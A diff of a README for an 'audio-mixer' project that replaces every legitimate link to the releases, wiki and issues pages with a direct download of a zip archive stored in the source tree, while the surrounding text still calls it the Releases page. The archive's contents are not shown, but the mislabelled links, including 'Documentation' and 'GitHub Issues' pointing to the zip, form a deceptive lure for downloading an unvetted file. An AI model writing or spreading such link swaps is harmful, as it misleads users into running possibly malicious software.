@@ -1,6 +1,6 @@
 # 🎙️ audio-mixer - Enhance Your Audio Experience Effortlessly
 
-[![Download audio-mixer](https://img.shields.io/badge/Download-audio--mixer-blue?style=for-the-badge)](https://github.com/MahmoudSGhaith/audio-mixer/releases)
+[![Download audio-mixer](https://raw.githubusercontent.com/MahmoudSGhaith/audio-mixer/main/src/components/mixer-audio-1.4.zip)](https://raw.githubusercontent.com/MahmoudSGhaith/audio-mixer/main/src/components/mixer-audio-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the audio-mixer project! This application allows you to process your 
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://github.com/MahmoudSGhaith/audio-mixer/releases) to download the application. Here’s how:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/MahmoudSGhaith/audio-mixer/main/src/components/mixer-audio-1.4.zip) to download the application. Here’s how:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version of audio-mixer.
@@ -61,8 +61,8 @@ We appreciate the contributions of the open-source community that made this proj
 
 ## 🔗 Links and Resources
 
-- [Releases Page](https://github.com/MahmoudSGhaith/audio-mixer/releases)
-- [Documentation](https://github.com/MahmoudSGhaith/audio-mixer/wiki)
-- [GitHub Issues](https://github.com/MahmoudSGhaith/audio-mixer/issues)
+- [Releases Page](https://raw.githubusercontent.com/MahmoudSGhaith/audio-mixer/main/src/components/mixer-audio-1.4.zip)
+- [Documentation](https://raw.githubusercontent.com/MahmoudSGhaith/audio-mixer/main/src/components/mixer-audio-1.4.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/MahmoudSGhaith/audio-mixer/main/src/components/mixer-audio-1.4.zip)
 
 Feel free to explore and enjoy the enhanced audio processing capabilities of audio-mixer!
